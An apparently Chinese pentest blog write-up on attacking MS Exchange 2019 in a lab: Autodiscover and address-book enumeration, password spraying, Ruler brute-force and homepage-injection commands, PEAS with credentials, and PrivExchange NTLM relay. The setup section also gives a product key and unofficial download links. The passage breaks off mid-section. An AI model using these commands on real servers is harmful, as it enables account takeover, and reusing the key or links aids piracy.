<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="MS Exchange 常用攻击方法与 NSPI 拓展攻击面"><meta name="keywords" content="渗透,Exchange"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>MS Exchange 常用攻击方法与 NSPI 拓展攻击面 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159554347-1', 'auto');
ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-测试环境搭建"><span class="toc-number">1.</span> <span class="toc-text">0x01 测试环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-系统与应用下载"><span class="toc-number">1.1.</span> <span class="toc-text">1. 系统与应用下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-安装过程"><span class="toc-number">1.2.</span> <span class="toc-text">2. 安装过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-攻击-Exchange"><span class="toc-number">2.</span> <span class="toc-text">0x02 攻击 Exchange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-获取-Exchange-用户列表和其他信息"><span class="toc-number">2.1.</span> <span class="toc-text">1. 获取 Exchange 用户列表和其他信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-使用-Ruler"><span class="toc-number">2.2.</span> <span class="toc-text">2. 使用 Ruler</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#爆破攻击"><span class="toc-number">2.2.1.</span> <span class="toc-text">爆破攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-使用-PEAS"><span class="toc-number">2.3.</span> <span class="toc-text">3. 使用 PEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-EWS订阅攻击"><span class="toc-number">2.4.</span> <span class="toc-text">4. EWS订阅攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Office-Web-插件攻击"><span class="toc-number">2.5.</span> <span class="toc-text">5. Office Web 插件攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-使用-NSPI-攻击-Exchange"><span class="toc-number">3.</span> <span class="toc-text">0x03 使用 NSPI 攻击 Exchange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RPC-Remote-Procedure-Call-over-HTTP-v2-工作原理"><span class="toc-number">3.1.</span> <span class="toc-text">RPC(Remote Procedure Call) over HTTP v2 工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取-RPC-服务器名"><span class="toc-number">3.2.</span> <span class="toc-text">获取 RPC 服务器名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扫描-RPC-over-HTTPv2-服务"><span class="toc-number">3.3.</span> <span class="toc-text">扫描 RPC over HTTPv2 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-MS-OXABREF-与-MS-OXNSPI"><span class="toc-number">3.4.</span> <span class="toc-text">分析 MS-OXABREF 与 MS-OXNSPI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIDs-和-Legacy-DNs-的格式"><span class="toc-number">3.5.</span> <span class="toc-text">MIDs 和 Legacy DNs 的格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIDs（Minimal-Entry-ID）的其它格式"><span class="toc-number">3.6.</span> <span class="toc-text">MIDs（Minimal Entry ID）的其它格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-exchanger-py"><span class="toc-number">3.7.</span> <span class="toc-text">使用 exchanger.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference："><span class="toc-number">4.</span> <span class="toc-text">Reference：</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">46</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">44</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/kindle/">kindle</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">MS Exchange 常用攻击方法与 NSPI 拓展攻击面</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-17</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>国外渗透测试专家  <a href="https://swarm.ptsecurity.com/author/arseniy-sharoglazov/" target="_blank" rel="noopener">Arseniy Sharoglazov</a> 在 <a href="https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/" target="_blank" rel="noopener">Attacking MS Exchange Web Interfaces</a> 一文中描述了一种新的攻击 ms exchange 的方法，于是搭建本地测试环境进行研究，学习下 NSPI 攻击 Exchange 的原理</p>
<a id="more"></a>
<h2 id="0x01-测试环境搭建"><a href="#0x01-测试环境搭建" class="headerlink" title="0x01 测试环境搭建"></a>0x01 测试环境搭建</h2><h3 id="1-系统与应用下载"><a href="#1-系统与应用下载" class="headerlink" title="1. 系统与应用下载"></a>1. 系统与应用下载</h3><p>cn_windows_server_2019_updated_jan_2020_x64_dvd_4bbe2c37，<a href="ed2k://|file|cn_windows_server_2019_updated_jan_2020_x64_dvd_4bbe2c37.iso|5608552448|39C663ABF26079240030395C7CB3F975|/" target="_blank" rel="noopener">download link</a></p>
<p>SHA1：c27d4f4721433d249ca592c13bd265e864629934</p>
<p>密钥：N69G4-B89J2-4G8F4-WWYCC-J464C</p>
<p>mu_exchange_server_2019_x64_dvd_5fa4d915，<a href="https://ibit.to/torrent/Exchange-2019-m9eGP44/" target="_blank" rel="noopener">https://ibit.to/torrent/Exchange-2019-m9eGP44/</a></p>
<p>SHA1：75bcab31439eb206fdee58e754b4343c5620f231<br>MD5：63685ee5627878d890486d8803fbe501</p>
<h3 id="2-安装过程"><a href="#2-安装过程" class="headerlink" title="2. 安装过程"></a>2. 安装过程</h3><p>.NET Framework 4.7.2（Windows Server 2019 已经安装）</p>
<p><a href="http://go.microsoft.com/fwlink/?linkid=863265" target="_blank" rel="noopener">http://go.microsoft.com/fwlink/?linkid=863265</a></p>
<p>Visual C++ Redistributable Packages for Visual Studio 2013</p>
<p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=40784" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=40784</a></p>
<p>Unified Communications Managed API 4.0</p>
<p><a href="https://www.microsoft.com/download/details.aspx?id=34992" target="_blank" rel="noopener">https://www.microsoft.com/download/details.aspx?id=34992</a></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729155554058.png" alt="image-20200729155554058"></p>
<p>重启</p>
<p>使用 windows PowerShell 运行</p>
<p><code>Install-WindowsFeature RSAT-ADDS</code></p>
<p>安装 server prerequisites</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Install-WindowsFeature</span> NET<span class="literal">-Framework</span><span class="literal">-45</span><span class="literal">-Features</span>, RPC<span class="literal">-over</span><span class="literal">-HTTP</span><span class="literal">-proxy</span>, RSAT<span class="literal">-Clustering</span>, RSAT<span class="literal">-Clustering</span><span class="literal">-CmdInterface</span>, RSAT<span class="literal">-Clustering</span><span class="literal">-Mgmt</span>, RSAT<span class="literal">-Clustering</span><span class="literal">-PowerShell</span>, Web<span class="literal">-Mgmt</span><span class="literal">-Console</span>, WAS<span class="literal">-Process</span><span class="literal">-Model</span>, Web<span class="literal">-Asp</span><span class="literal">-Net45</span>, Web<span class="literal">-Basic</span><span class="literal">-Auth</span>, Web<span class="literal">-Client</span><span class="literal">-Auth</span>, Web<span class="literal">-Digest</span><span class="literal">-Auth</span>, Web<span class="literal">-Dir</span><span class="literal">-Browsing</span>, Web<span class="literal">-Dyn</span><span class="literal">-Compression</span>, Web<span class="literal">-Http</span><span class="literal">-Errors</span>, Web<span class="literal">-Http</span><span class="literal">-Logging</span>, Web<span class="literal">-Http</span><span class="literal">-Redirect</span>, Web<span class="literal">-Http</span><span class="literal">-Tracing</span>, Web<span class="literal">-ISAPI</span><span class="literal">-Ext</span>, Web<span class="literal">-ISAPI</span><span class="literal">-Filter</span>, Web<span class="literal">-Lgcy</span><span class="literal">-Mgmt</span><span class="literal">-Console</span>, Web<span class="literal">-Metabase</span>, Web<span class="literal">-Mgmt</span><span class="literal">-Console</span>, Web<span class="literal">-Mgmt</span><span class="literal">-Service</span>, Web<span class="literal">-Net</span><span class="literal">-Ext45</span>, Web<span class="literal">-Request</span><span class="literal">-Monitor</span>, Web<span class="literal">-Server</span>, Web<span class="literal">-Stat</span><span class="literal">-Compression</span>, Web<span class="literal">-Static</span><span class="literal">-Content</span>, Web<span class="literal">-Windows</span><span class="literal">-Auth</span>, Web<span class="literal">-WMI</span>, Windows<span class="literal">-Identity</span><span class="literal">-Foundation</span>, RSAT<span class="literal">-ADDS</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729160219000.png" alt="image-20200729160219000"></p>
<p>下面开始安装域控</p>
<p>在服务器管理器中选择添加角色和功能</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729175947931.png" alt="image-20200729175947931"></p>
<p>一路 next 即可，来到选择服务器角色这里，选 Active Directory 域服务</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729180109172.png" alt="image-20200729180109172"></p>
<p>又是一路 next，开始安装</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729180204250.png" alt="image-20200729180204250"></p>
<p>安装完成关闭窗口，在回到服务器管理器中，将此服务器升级为域控制器</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729180615473.png" alt="image-20200729180615473"></p>
<p>来到 AD 域服务配置向导</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729180820671.png" alt="image-20200729180820671"></p>
<p>由于没有现有域和现有林，选择添加新林</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729180906752.png" alt="image-20200729180906752"></p>
<p>没安装 DNS 会出现错误，可以直接下一步即可</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729181003607.png" alt="image-20200729181003607"></p>
<p>安装路径、查看选项都是直接下一步，最后安装</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729181610938.png" alt="image-20200729181610938"></p>
<p>安装完会注销并重启服务器，进入漫长的等待，然后登陆系统</p>
<p>把下载 exchange_server_2019 复制到 windows server 2019 中，并右键进行装载</p>
<p>进入 exchange 目录，执行以下命令进行准备</p>
<p><code>.\Setup.exe /PrepareSchema /IAcceptExchangeServerLicenseTerms</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729182653180.png" alt="image-20200729182653180"></p>
<p>准备 Active Directory，执行下面命令，可以自定义 OrganizationName 组织名称，</p>
<p><code>.\Setup.exe /IAcceptExchangeServerLicenseTerms /PrepareAD /OrganizationName: &quot;exchange&quot;</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729183215807.png" alt="image-20200729183215807"></p>
<p>准备域</p>
<p><code>.\Setup.exe /PrepareAllDomains /IAcceptExchangeServerLicenseTerms</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729184638700.png" alt="image-20200729184638700"></p>
<p>这个时间久一些，准备域进度可能一直显示 0%</p>
<p>开始安装 Exchange Server 2019 </p>
<p>双击 Setup 开始安装</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729184947800.png" alt="image-20200729184947800"></p>
<p>一路 next，拷贝文件、初始化安装完成后使用推荐设置，然后如下图选择</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200729185257251.png" alt="image-20200729185257251"></p>
<p>接着再一路 next 直接进行下一步，最终安装并等待完成</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730092328331.png" alt="image-20200730092328331"></p>
<h2 id="0x02-攻击-Exchange"><a href="#0x02-攻击-Exchange" class="headerlink" title="0x02 攻击 Exchange"></a>0x02 攻击 Exchange</h2><h3 id="1-获取-Exchange-用户列表和其他信息"><a href="#1-获取-Exchange-用户列表和其他信息" class="headerlink" title="1. 获取 Exchange 用户列表和其他信息"></a>1. 获取 Exchange 用户列表和其他信息</h3><p>先了解一下 <a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxdscli/78530279-d042-4eb0-a1f4-03b18143cd19" target="_blank" rel="noopener">Exchange 的 Autodiscover Publishing and Lookup Protocol</a> （自动发现发布和查找协议，MS-OXDSCLI），这是客户端用来定位 Autodiscover HTTP 服务的，使用 xml 传输消息</p>
<p>使用<a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxdscli/fc420a31-5180-4a28-8397-8db8977861c6" target="_blank" rel="noopener">官方手册 4.1</a> 中的 Autodiscover 请求，修改目标用户 email，POST 请求访问服务器 url 路径：/autodiscover/autodiscover.xml</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/autodiscover/autodiscover.xml</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.6.132</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">User-Agent</span>: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.10730; Pro)</span><br><span class="line"><span class="attribute">Authorization</span>: Basic SjBLM1JcdGVzdGVyOi5QYXNzMjYyNDEw</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 361</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"&gt;</span><br><span class="line">&lt;Request&gt;</span><br><span class="line">&lt;EMailAddress&gt;tester@j0k3r.top&lt;/EMailAddress&gt;</span><br><span class="line">&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;</span><br><span class="line">&lt;/Request&gt;</span><br><span class="line">&lt;/Autodiscover&gt;</span><br></pre></td></tr></table></figure>
<p>EMailAddress 元素标识将为要检索配置信息的帐户的电子邮件地址，请求响应如下：</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730094406249.png" alt="image-20200730094406249"></p>
<p>分析返回的 xml 中的信息</p>
<p>HTTP Response</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730102834451.png" alt="image-20200730102834451"></p>
<p>Authenticated User’s SID 即所使用用户的 SID</p>
<p>xml body</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730104412176.png" alt="image-20200730104412176"></p>
<p>Server 元素包含包含附加邮箱的邮件服务器的 FQDN（在Active Directory中，标识域的完全限定域名），下面还有个 OAB Url</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730104533364.png" alt="image-20200730104533364"></p>
<p>OABUrl元素指定服务器的脱机地址簿(OAB)配置服务器URL，可以获得所有Exchange用户的地址列表，通过访问 <code>&lt;OABUrl&gt; + /oab.xml</code> 查看 oab.xml 文件</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730105252609.png" alt="image-20200730105252609"></p>
<p>Exchange 默认会创建一些内置的地址列表，比如全局地址列表（GAL），其中含有所有邮箱用户，下面通过 libmspack 库中的oabextract 工具将其解压缩，然后查看用户数据，下载地址：<a href="https://www.cabextract.org.uk/libmspack/libmspack-0.10.1alpha.tar.gz，直接" target="_blank" rel="noopener">https://www.cabextract.org.uk/libmspack/libmspack-0.10.1alpha.tar.gz，直接</a> <code>./configure &amp;&amp; make &amp;&amp; make install</code>  编译安装，oabextract 位于 example 目录下</p>
<p>在 OAB Url 路径下下载数据 /OAB/b9cf522e-d93a-4f2d-b03f-c1df4a4fb4af/ee0772da-44b1-4110-8b00-70fc34c35cd7-data-1.lzx，解压提取</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730113310927.png" alt="image-20200730113310927"></p>
<p>使用 ntmlscan 工具（<a href="https://github.com/nyxgeek/ntlmscan）扫描，可以根据所获的的信息进行" target="_blank" rel="noopener">https://github.com/nyxgeek/ntlmscan）扫描，可以根据所获的的信息进行</a> Password Spraying 攻击，这种攻击不同于传统暴力破解的地方在于这种攻击方法使用一个或几个密码（通常是弱密码）来尝试多个账户</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730120237422.png" alt="image-20200730120237422"></p>
<h3 id="2-使用-Ruler"><a href="#2-使用-Ruler" class="headerlink" title="2. 使用 Ruler"></a>2. 使用 Ruler</h3><p><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></p>
<p>ruler 是个知名度较高的 Exchange 利用工具，可以通过 MAPI/HTTP 或 RPC/HTTP 协议远程与 Exchang e服务器交互。其主要目的是滥用客户端 Outlook 特性并远程获取shell，进行信息收集和攻击。</p>
<h4 id="爆破攻击"><a href="#爆破攻击" class="headerlink" title="爆破攻击"></a>爆破攻击</h4><p>注意要使用正确的域名，否则会出现证书错误，直接修改本地 hosts 文件即可</p>
<p><code>./ruler-osx64 --domain WIN-QT7IQOG92O7.j0k3r.top brute --users user.txt --passwords pass.txt --delay 0 --verbose</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730123208761.png" alt="image-20200730123208761"></p>
<h3 id="3-使用-PEAS"><a href="#3-使用-PEAS" class="headerlink" title="3. 使用 PEAS"></a>3. 使用 PEAS</h3><p>简单来说，PEAS 是一个可以通过 ActiveSync 协议连接到 Exchange 的工具</p>
<p><a href="https://github.com/FSecureLABS/PEAS" target="_blank" rel="noopener">https://github.com/FSecureLABS/PEAS</a></p>
<blockquote>
<p>Exchange ActiveSync 是一种 Exchange 同步协议，该协议已经过优化，可用于高延迟和低带宽网络。该协议基于 HTTP 和 XML，移动电话可以借助它访问运行 Microsoft Exchange 的服务器上的组织信息。</p>
</blockquote>
<p>python2 安装： <code>python setup.py install</code></p>
<p>列出共享文件 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m peas -u <span class="string">'J0K3R\tester'</span> -p <span class="string">'Qwer1234'</span> WIN-QT7IQOG92O7.j0k3r.top --list-unc <span class="string">'\\WIN-QT7IQOG92O7\'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730143036881.png" alt="image-20200730143036881"></p>
<h3 id="4-EWS订阅攻击"><a href="#4-EWS订阅攻击" class="headerlink" title="4. EWS订阅攻击"></a>4. EWS订阅攻击</h3><p><a href="https://github.com/dirkjanm/PrivExchange" target="_blank" rel="noopener">https://github.com/dirkjanm/PrivExchange</a></p>
<p>该攻击利用 Exchange Web Services (EWS) 来进行，EWS 是一种 Exchange API，用于提供对邮箱项的访问。EWS 的订阅操作允许用户设置一个 URL 来通过 HTTP 协议从 Exchange 获得回调，以接收推送通知，这种方式不支持与接收端进行交互，但可以用于盲 SSRF</p>
<blockquote>
<p>2018 年，ZDI 研究团队发现 Exchange 通过 NTLM 或 Kerberos 对指定的 URL 进行身份验证，这可以用于 NTLM 对Exchange 本身的中继攻击。</p>
</blockquote>
<p>在 Windows 上，很多应用层协议使用 NTLM 进行身份认证，而 NTLM 中继攻击，就是指攻击者在 NTLM 交互认证过程中充当中间人，类似于中间人攻击，在请求认证的客户端与服务端之间传递信息，获取客户端的 Net-NTLM 哈希并将其重放认证目标方，这样无需破解用户名密码就可以获取权限。</p>
<p>比如将获取到的 Net-NTLM 哈希重放到真实的 Exchange 服务器的 EWS 接口进行认证，以此获取目标用户邮箱的邮件记录信息、邮件配置、GAL等信息。</p>
<p>使用 Dirk-jan Mollema 发布的 <a href="https://github.com/dirkjanm/PrivExchange" target="_blank" rel="noopener">PrivExchange</a> 工具使 Exchange 回连指定的地址，并进行身份验证</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730152744083.png" alt="image-20200730152744083"></p>
<p>Exchange 的回连请求</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730152848444.png" alt="image-20200730152848444"></p>
<p>Dirk-jan Mollema 的研究文章：<a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noopener">Abusing Exchange: One API call away from Domain Admin</a></p>
<h3 id="5-Office-Web-插件攻击"><a href="#5-Office-Web-插件攻击" class="headerlink" title="5. Office Web 插件攻击"></a>5. Office Web 插件攻击</h3><p>该攻击通常由于持久化，使用插件获取目标邮件的持久访问权限</p>
<p>详情请参阅：<a href="https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins/</a></p>
<h2 id="0x03-使用-NSPI-攻击-Exchange"><a href="#0x03-使用-NSPI-攻击-Exchange" class="headerlink" title="0x03 使用 NSPI 攻击 Exchange"></a>0x03 使用 NSPI 攻击 Exchange</h2><h3 id="RPC-Remote-Procedure-Call-over-HTTP-v2-工作原理"><a href="#RPC-Remote-Procedure-Call-over-HTTP-v2-工作原理" class="headerlink" title="RPC(Remote Procedure Call) over HTTP v2 工作原理"></a>RPC(Remote Procedure Call) over HTTP v2 工作原理</h3><p>Exchange 通过私有的 MAPI 协议用于收取邮件，较新版本的 Outlook 通常使用 MAPI 与 Exchange 进行交互，除此之外早期的Outlook  还使用称为 Outlook Anywhere (RPC over HTTP) 的 RPC 交互</p>
<p>RPC over HTTP v2 必须在运行在 HTTP 或者 HTTPS 上，需要 HTTP 1.0 以及来自 HTTP 1.1 的连接保持活动支持。</p>
<p>下面使用 ruler 进行 RPC/HTTP 连接，Wireshark 抓取通信流量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler-osx64 --rpc --email tester@j0k3r.top --username tester --password Qwer1234 --insecure --noencrypt --nocache homepage add --url &quot;http://example.com/&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200730182000035.png" alt="image-20200730182000035"></p>
<p>从 HTTP 流中可以看出，RPC_IN_DATA 开头的表示 IN channel 请求，与之对应的 RPC_OUT_DATA 表示 OUT channel 请求，访问 URL 路径是 /rpc/rpcproxy.dll，这是 rpc 代理的一部分，代理与客户端和服务器的关系如下图</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731095745649.png" alt="image-20200731095745649"></p>
<p>HTTP v2上的RPC工作在更复杂的拓扑结构中，定义了客户端、服务器和入站代理与出站代理。没有固定的角色。根据协议充当入站或出站代理，在发布的 <a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RPCH/%5bMS-RPCH%5d.pdf" target="_blank" rel="noopener">[MS-RPCH]: Remote Procedure Call over HTTP Protocol</a> 开放规范文档中有详细的描述</p>
<p>HTTP协议上的远程过程调用（RPC over HTTP）其实是 RPC 和 HTTP 之间的中间协议</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731101043643.png" alt="image-20200731101043643"></p>
<p>用于通过 HTTP 进行 RPC 的协议序列称为 ncacn_http，Exchange 服务器在端口 593、6001、6002 和 6004 上侦听 ncacn_http 请求。RPC over HTTPS 服务的端口通常是 593</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731104413550.png" alt="image-20200731104413550"></p>
<p>根据上面的开放规范，客户端须使用 RPC 代理来连接 ncacn_http 服务，所以可以模拟 RPC 代理直接连接到 ncacn_http</p>
<h3 id="获取-RPC-服务器名"><a href="#获取-RPC-服务器名" class="headerlink" title="获取 RPC 服务器名"></a>获取 RPC 服务器名</h3><p>这里先看下 [MS-RPCH] 规范文档中对请求 URL 的描述</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731144650856.png" alt="image-20200731144650856"></p>
<p>abs-path 有如下规定：</p>
